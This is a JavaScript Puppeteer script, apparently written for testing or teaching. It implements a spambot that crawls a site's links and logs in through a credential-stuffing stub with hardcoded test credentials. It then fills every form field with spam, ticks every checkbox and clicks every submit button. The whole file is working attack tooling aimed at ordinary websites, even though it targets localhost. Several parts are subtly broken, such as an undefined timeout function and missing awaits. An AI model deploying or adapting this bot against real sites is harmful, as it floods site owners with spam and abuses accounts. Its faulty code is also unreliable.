import puppeteer from "puppeteer";

/*
 * Author: Morgan Jones
 * Updated: 06/28/2024
 *
 * This program is designed to represent a bot that attempts to stuff spam onto any website form it can find.
 * We assume this program to be a module in a larger program, one which crawls the web looking for victim sites.
 * For obvious ethical and legal reasons we cannot test our spam bot on live sites. But hopefully you can imagine its place in a larger program.
 *
 * This spambot is naive because it doesn't check for honeypot CAPTCHA fields, and has limited ability to troubleshoot site navigation issues. It makes simple assumptions about how a login page is formatted, for example.
 *
 * Update: The spambot does not need to check for honeypot fields... because the puppeteer api already does it. When puppeteer "clicks" or "types" it actually performs many browser actions under the hood. These include locating the element on the page, scrolling it into view, focusing the element and then clicking on it, finally it performs the actual key movements to type. If you attempt to "type" into a honeypot field using Puppeteer it will silently fail because it can't locate the element on the page.
 */

(async () => {
	const browser = await puppeteer.launch({ headless: false, slowMo: 30 });
  const page = await browser.newPage();
  await page.setViewport({ width: 1080, height: 1024, deviceScaleFactor: 1 });
  page.on('console', msg => console.log('PAGE LOG:', msg.text()));
  await page.goto("http://localhost:8080", {waitUntil: "load"});

  const message = "SPAM! SPAM! SPAM!";
  
  const emails = await page.$("::-p-text(@)");
  const links = await page.$$("a");
  const urls = await (async () => {
    const linkUrls = await Promise.all(await links.map(link => page.evaluate(link => link.href, link)));
    const pageUrl = await page.url();
    return linkUrls.filter(url => url !== pageUrl);
  })();

  const password = await page.$("input[type='password']");
  if (password) {
    console.log("Logging in...");
    await Login(page);
  }

  for await (const url of urls) {
    console.log(`Moving to url...${url}`);
    await page.goto(url, {waitUntil: "load"});
    console.log("Spamming form...");
    await stuffForms(page, message);
  }
})();

// Credit to https://medium.com/@brenthoover/applying-a-timeout-to-promises-with-promise-race-8ab5fa0edafc
// Used to avoid the spam bot hanging forever if it attempts to await an element that doesn't arrive
async function promiseOrTimeout (promise, ms) {
	return Promise.race([
		promise,
		timeout(ms)
	]);
}

async function elementsOrTimeout (promise) {
	// Convenience wrapper
	// If there was a timeout no elements were found, simply return an empty list
	// Otherwise return the promise result
	return promise
		.then(element => element)
		.catch(error => []);
}

async function getLogin(page) {
  const button = page.$("::-p-text(Log)") ?? page.$("::-p-text(log)");
  if (button) {
    return button;
  }

  const inputs = await page.$$("input");
  for await (const input of inputs) {
    const value = await page.evaluate((input) => input.value, input);
    if (typeof (value == String)) {
      const cleaned = value.trim().toLowerCase();
      if (cleaned.includes("log")) {
        return input;
      }
    }
  }
}

async function getUsername(page) {
  const inputs = await page.$$("input");
  for await (const input of inputs) {
    const name = await page.evaluate((input) => input.name, input);
    if (
      name.toLowerCase().includes("user") ||
      name.toLowerCase().includes("name")
    ) {
      return input;
    }
  }
}

const submitQueries = [
    "input[type='submit']",
    "button[type='submit']",
    "button",
]
/*
		"::-p-text('Log')",
    "::-p-text('Sign')",
    "::-p-text('log')",
    "::-p-text('sign')",
    "::-p-text('Submit')",
    "::-p-text('submit')",
*/

async function stuffCredentials(page, usernameQuery, passwordQuery) {
  /*
   * We are assuming that the attacker has some method of stuffing credentials to get into an account.
   * Our test is not designed to analyze credential stuffing logistics.
   * For now we assume that the spambot was able to identify an account in a list and insert the credentials for a valid account.
   */
  try {
  await page.evaluate(() => document.querySelector("input").value = "jay");
  await page.evaluate(() => document.querySelector("input[type='password']").value = "bird");
  for await (const query of [
    "input[type='submit']",
    "button[type='submit']",
    "button"
    ]) {
    const submit = await page.$(query);
    if (submit) {
      await Promise.all([page.waitForNavigation(), submit.click()]);
      break;
    }
  };
  } catch {
    console.log("Unable to log in...");
  };
}

async function Login(page) {
  await stuffCredentials(page, "input", "input[type='password']");
}

async function stuffForm(formElement, page, message) {
  
	console.log("Stuffing page with spam...");

  const inputs = await elementsOrTimeout(formElement.$$("input"));
	for await (const input of inputs) {
    const type = page.evaluate((input) => input.type, input);

    //We want to finish stuffing form data before submitting
    if (type === "submit" || type === "button") {
      continue;
    }

    //Better safe than sorry, make sure we aren't missing a terms of agreement or some such
    if (type === "checkbox") {
      input.click();
      continue;
    }

    await input.type(message);
  }
  const textAreas = await elementsOrTimeout(formElement.$$("textarea"));
  
  for await (const textArea of textAreas) {
    await textArea.type(message);
  }
  
  for await (const query of submitQueries) {
    const elems = await elementsOrTimeout(page.$$(query));
		for (const elem of elems) {
			await elem.click();
		}
	}
}

async function stuffForms(page, message) {
  const forms = await page.$$("form");
  for await (const form of forms) {
    await stuffForm(form, page, message);
  }
}

